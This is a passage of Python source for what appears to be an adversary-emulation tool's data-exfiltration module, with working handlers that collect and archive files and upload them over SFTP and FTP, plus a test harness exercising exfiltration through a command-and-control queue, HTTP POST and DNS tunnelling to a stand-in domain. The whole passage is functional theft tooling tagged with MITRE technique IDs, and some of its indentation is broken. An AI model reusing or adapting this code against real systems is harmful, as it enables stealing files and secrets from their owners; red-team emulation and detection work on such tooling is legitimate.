            ssh.connect(hostname=hostname, port=port, username=username,
                        password=password, key_filename=key_filename, 
                        timeout=timeout,
                        look_for_keys=True, # Automatically look for discoverable private-keys
                        allow_agent=False) # Disable SSH agent forwarding for security
            self.logger.info(f"SSH connection established to {hostname}")

            # 3. Open SFTP Session and Upload
            sftp = ssh.open_sftp()
            self.logger.info(f"SFTP session opened. Uploading {local_filename}...")
            
            # Construct remote path using provided directory
            remote_target_path = f"{remote_dir_str.rstrip('/')}/{local_filename}"
            result_details["remote_target_path"] = remote_target_path
            self.logger.debug(f"Uploading local '{archive_path}' to remote '{remote_target_path}'")
            
            # Perform the upload
            sftp.put(archive_path, remote_target_path)
            result_details["sftp_status"] = "Upload successful"
            self.logger.info(f"File uploaded successfully to {remote_target_path}")
            status = "success"
            reason = "SFTP exfiltration successful."
            
        except paramiko.ssh_exception.HostKeysException as key_err:
             reason = f"SFTP Host Key error for {hostname}: {key_err}. Ensure host key is in known_hosts."
             self.logger.error(reason)
             result_details["error"] = reason
             status = "failure"
        except Exception as e:
            reason = f"Error during SFTP exfil: {e}"
             self.logger.error(reason, exc_info=True)
            result_details["error"] = str(e)
             status = "failure"
        finally:
            # 4. Cleanup
            if sftp:
                try: sftp.close()
                except Exception: pass
            if ssh:
                try: ssh.close()
                except Exception: pass
                
            if is_temporary_staging and staging_dir_path:
                self.logger.debug(f"Cleaning up temporary staging directory: {staging_dir_path}")
                self._cleanup_directory(staging_dir_path) 
            elif staging_dir_path:
                 self.logger.info(f"Skipping cleanup of non-temporary staging directory: {staging_dir_path}")
                 
        return {
            "status": status,
            "technique": "exfil_sftp",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details,
            "reason": reason if status != "success" else None
        }

    def _handle_exfil_ftp(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Exfiltrates data via FTP using Passive Mode by default."""
        status = "failure"
        mitre_id = "T1048.003" # Exfiltration Over Alternative Protocol
        mitre_name = "Exfiltration Over Alternative Protocol: FTP"
        result_details = {
            "hostname": details.get("hostname"),
            "port": details.get("port", 21),
            "username": details.get("username", "anonymous"),
            "remote_path": details.get("remote_path", "/"),
            "use_passive_mode": details.get("use_passive_mode", True),
            "ftp_status": None,
            "error": None,
            "collected_files_count": 0,
            "total_collected_kb": 0,
            "skipped_files": [],
            "staged_path": None,
            "archive_path": None,
            "archive_size_kb": 0,
        }
        archive_path: Optional[str] = None
        staging_dir_path: Optional[Path] = None
        is_temporary_staging = False
        ftp: Optional[ftplib.FTP] = None

        # Validate required connection details
        if not result_details["hostname"]:
            reason = "Missing required FTP parameter: hostname"
            self.logger.error(reason)
            result_details["error"] = reason
            return {"status": "error", "reason": reason, "details": result_details,
                    "mitre_technique_id": mitre_id, "mitre_technique_name": mitre_name}

        hostname = result_details["hostname"]
        port = result_details["port"]
        username = result_details["username"]
        password = details.get("password", "")
        remote_dir_str = result_details["remote_path"]
        use_passive = result_details["use_passive_mode"]
        timeout = details.get("timeout", 30)

        self.logger.info(f"Starting exfil via FTP to {username}@{hostname}:{port}{remote_dir_str} (Passive: {use_passive})")

        try:
            # 1. Collect, Stage, Archive
            self.logger.debug("Step 1: Collecting files...")
            collected_files, total_kb, skipped = self._collect_files(details)
            result_details["collected_files_count"] = len(collected_files)
            result_details["total_collected_kb"] = round(total_kb, 2)
            result_details["skipped_files"] = skipped
            if not collected_files:
                raise FileNotFoundError("No files collected for FTP exfiltration.")
            self.logger.info(f"Collected {len(collected_files)} files ({total_kb:.2f} KB).")

            self.logger.debug("Step 2: Staging and archiving...")
            archive_path, error_msg, is_temporary_staging = \
                self._stage_and_archive_files(collected_files, details)
            if not archive_path:
                raise Exception(f"Failed to create archive: {error_msg}")
            archive_path_obj = Path(archive_path)
            staging_dir_path = archive_path_obj.parent
            archive_size_kb = archive_path_obj.stat().st_size / 1024.0
            result_details["staged_path"] = str(staging_dir_path)
            result_details["archive_path"] = archive_path
            result_details["archive_size_kb"] = archive_size_kb
            self.logger.info(f"Created archive: {archive_path} ({archive_size_kb:.2f} KB)")
            local_filename = archive_path_obj.name

            # 2. Connect and Login to FTP Server
            self.logger.debug(f"Step 3: Connecting to FTP server {hostname}:{port}...")
            ftp = ftplib.FTP()
            # Use connect timeout
            ftp.connect(hostname, port, timeout=timeout)
            self.logger.info(f"FTP connection established. Logging in as {username}...")
            ftp.login(user=username, passwd=password)
            self.logger.info("FTP login successful.")
            
            # Set Passive mode
            ftp.set_pasv(use_passive)
            self.logger.debug(f"FTP Passive mode set to: {use_passive}")

            # 3. Change Directory and Upload
            self.logger.debug(f"Changing to remote directory: {remote_dir_str}")
            ftp.cwd(remote_dir_str)
            self.logger.info(f"Changed to remote directory. Uploading {local_filename}...")
            
            # Construct remote path using directory and local filename
            remote_target_path = f"{remote_dir_str.rstrip('/')}/{local_filename}"
            result_details["remote_target_path"] = remote_target_path
            
            with open(archive_path, 'rb') as fp:
                # Use storbinary for binary transfer (typically needed for archives)
                res = ftp.storbinary(f'STOR {local_filename}', fp)
                if not res.startswith("226"): # Check for successful transfer code
                     raise ftplib.error_perm(f"FTP upload failed with response: {res}")
            
            result_details["ftp_status"] = f"Upload successful ({res})"
            self.logger.info(f"File uploaded successfully via FTP. Response: {res}")
            status = "success"
            reason = "FTP exfiltration successful."
            
        except FileNotFoundError as fnf_err:
             reason = str(fnf_err)
             self.logger.error(f"FTP exfil failed: {reason}")
             result_details["error"] = reason
             status = "failure"
        except ftplib.all_errors as ftp_err:
             reason = f"FTP operation failed: {ftp_err}"
             self.logger.error(reason)
             result_details["error"] = str(ftp_err)
             result_details["ftp_status"] = f"FTP Error: {ftp_err}"
             status = "failure"
        except Exception as e:
             reason = f"Error during FTP exfil: {e}"
             self.logger.error(reason, exc_info=True)
             result_details["error"] = str(e)
             status = "failure"
        finally:
            # 4. Cleanup
            if ftp:
                try: 
                    ftp.quit()
                    self.logger.debug("FTP connection closed.")
                except ftplib.all_errors: # Ignore errors during quit
                    pass 
                except Exception: pass
                
            if is_temporary_staging and staging_dir_path:
                self.logger.debug(f"Cleaning up temporary staging directory: {staging_dir_path}")
                self._cleanup_directory(staging_dir_path) 
            elif staging_dir_path:
                 self.logger.info(f"Skipping cleanup of non-temporary staging directory: {staging_dir_path}")

        return {
            "status": status,
            "technique": "exfil_ftp",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details,
            "reason": reason if status != "success" else None
        }

    def _handle_scheduled_transfer(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Simulates scheduling an exfiltration task."""
        status = "success" # Simulate successful scheduling
        mitre_id = "T1053" # Scheduled Task/Job
        mitre_name = "Scheduled Task/Job: Scheduled Transfer"
        reason = "Simulation: Scheduled transfer task logged."
        result_details = {
            "schedule_details": details.get("schedule", "Not specified"),
            "underlying_method": details.get("transfer_method", "Not specified"),
            "underlying_details": details.get("transfer_details", {}),
            "message": reason
        }
        
        self.logger.info(f"Simulating scheduling of exfiltration.")
        self.logger.info(f"  Schedule: {result_details['schedule_details']}")
        self.logger.info(f"  Method: {result_details['underlying_method']}")
        
        # Optionally, immediately run the underlying transfer as part of the simulation?
        # run_now = details.get("simulate_run_now", False)
        # if run_now:
        #     self.logger.info("Simulating immediate run of scheduled transfer...")
        #     # This is complex as we need to map transfer_method back to a handler
        #     pass 
            
        return {
            "status": status,
            "technique": "scheduled_transfer_simulation",
            "mitre_technique_id": mitre_id,
            "mitre_technique_name": mitre_name,
            "timestamp": datetime.now().isoformat(),
            "details": result_details,
            "reason": None # Status is success for simulation
        }

    def _handle_not_implemented(self, details: Dict[str, Any]) -> Dict[str, Any]:
        """Placeholder for not-yet-implemented exfiltration methods."""
        method_name = details.get('_original_method', 'Unknown') # Get original method name
        reason = f"Exfiltration method '{method_name}' is not implemented."
        self.logger.warning(reason)
        return {"status": "not_implemented", "reason": reason, "method": method_name}

    def _log_error(self, message: str, exc_info=False) -> None:
        """Helper for logging errors."""
        self.logger.error(message, exc_info=exc_info)

# Example Usage (for testing)
if __name__ == '__main__':
    import json
    
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')

    # Mock CommandControl with a queue for testing
    class MockCommandControl:
        def __init__(self):
            self.outgoing_queue = []
            self.results_lock = threading.Lock() # Mimic lock if using results queue
            self.task_results_queue = self.outgoing_queue # Use same queue for fallback
            self.logger = logging.getLogger("MockC2")
            
        def queue_outgoing_data(self, data: Dict[str, Any]):
            self.logger.info(f"[MockC2] Queued outgoing data: { {k: v[:50] + '...' if isinstance(v, str) and len(v) > 50 else v for k, v in data.items()} }")
            self.outgoing_queue.append(data)
            
        def get_queued_data(self):
            return self.outgoing_queue[:]
            
    mock_c2 = MockCommandControl()
    exfil_module = Exfiltration(command_control_module=mock_c2)
    # exfil_module.update_config({}) # Load actual config here if needed

    # --- Setup Test Files --- 
    test_dir = tempfile.mkdtemp(prefix="bluefire_exfil_testdir_")
    file_paths_created = []
    try:
        # Create some dummy files
        content1 = "This is sensitive file one." * 500 # Make it ~10KB
        path1 = os.path.join(test_dir, "secret_doc.txt")
        with open(path1, "w") as f: f.write(content1)
        file_paths_created.append(path1)
        
        content2 = '{"key": "value", "data": [1, 2, 3]}' * 100 # Small JSON
        path2 = os.path.join(test_dir, "config.json")
        with open(path2, "w") as f: f.write(content2)
        file_paths_created.append(path2)
        
        # Create a larger file to test size limits
        content3 = "Large file content." * 100000 # ~1.8MB
        path3 = os.path.join(test_dir, "large_log.log")
        with open(path3, "w") as f: f.write(content3)
        file_paths_created.append(path3)
        
        print(f"Created test directory and files: {test_dir}")
        
        # --- Test Case 1: Collect txt and json, archive, exfil via C2 --- 
        print("\n--- Test Case 1: Archive *.txt, *.json via C2 ---")
        exfil_request_1 = {"exfiltrate": {
            "method": "via_c2", 
            "details": {
                "paths": [test_dir],
                "patterns": ["*.txt", "*.json"],
                "recursive": True,
                "archive": True,
                "c2_chunk_size_bytes": 5 * 1024 # Small chunks for testing
            }
        }}
        result1 = exfil_module.run_exfiltration(exfil_request_1)
        print(json.dumps(result1, indent=2))
        if hasattr(mock_c2, 'outgoing_exfil_queue'):
             print(f"Mock C2 Exfil Queue length: {len(mock_c2.outgoing_exfil_queue)}")
             if mock_c2.outgoing_exfil_queue:
                  first_chunk = mock_c2.outgoing_exfil_queue[0]
                  print(f"First chunk data (first 50 chars): {first_chunk.get('data', '')[:50]}")
             mock_c2.outgoing_exfil_queue.clear() # Clear queue for next test
        
        # --- Test Case 2: Collect log file (too large), should be skipped --- 
        print("\n--- Test Case 2: Collect large log (should skip) via C2 ---")
        exfil_request_2 = {"exfiltrate": {
            "method": "via_c2", 
            "details": {
                "paths": [test_dir],
                "patterns": ["*.log"],
                "max_file_size_kb": 1000, # Set max size to 1MB
                "archive": True, # Archive first
                "c2_chunk_size_bytes": 512 * 1024
            }
        }}
        result2 = exfil_module.run_exfiltration(exfil_request_2)
        print(json.dumps(result2, indent=2))
        if hasattr(mock_c2, 'outgoing_exfil_queue'):
            print(f"Mock C2 Exfil Queue length: {len(mock_c2.outgoing_exfil_queue)}") # Should be 0
            mock_c2.outgoing_exfil_queue.clear()

        # --- Test Case 3: Direct HTTP Exfil --- 
        print("\n--- Test Case 3: Collect all, Direct HTTP Exfil (requires mock server or real endpoint) ---")
        # NOTE: This requires a server running to receive the POST request!
        # Example using httpbin.org for testing (use with caution):
        # target_http_url = "https://httpbin.org/post"
        # Or setup a simple local server: `python -m http.server 8000` 
        # and use target_http_url = "http://localhost:8000/upload" (will fail but show request)
        target_http_url = "http://localhost:9999/placeholder_upload" # Placeholder URL
        print(f"(Note: Test Case 3 requires a server listening at {target_http_url} to fully succeed)")
        exfil_request_3 = {"exfiltrate": {
            "method": "direct_http", 
            "details": {
                "paths": [test_dir],
                "patterns": ["*.txt"],
                "max_file_size_kb": 20000, 
                "archive": True,
                "target_url": target_http_url
            }
        }}
        result3 = exfil_module.run_exfiltration(exfil_request_3)
        print(json.dumps(result3, indent=2))
        # No C2 queue involved here

        # --- Test Case 4: DNS Tunnel Exfil --- 
        print("\n--- Test Case 4: Collect small file, DNS Tunnel Exfil --- ")
        # NOTE: This performs REAL DNS queries. Use a domain you control or a test domain.
        target_dns_domain = "tunnel.example.com" # Replace with a controlled domain
        print(f"(Note: Test Case 4 performs REAL DNS queries to '{target_dns_domain}'. Ensure this is intended.)")
        exfil_request_4 = {"exfiltrate": {
            "method": "dns_tunnel", 
            "details": {
                "paths": [path2], # config.json (small file)
                "patterns": ["*"],
                "archive": True, # Archive it first
                "controlled_domain": target_dns_domain,
                "chunk_size": 50 # Smaller chunk size for DNS labels
            }
        }}
        result4 = exfil_module.run_exfiltration(exfil_request_4)
        print(json.dumps(result4, indent=2))

    finally:
        # --- Cleanup --- 
        print(f"\n--- Cleaning up test directory: {test_dir} ---")
        if os.path.exists(test_dir):
             try:
                  shutil.rmtree(test_dir)
                  print("Test directory removed.")
             except Exception as e:
                  print(f"Error removing test directory {test_dir}: {e}") 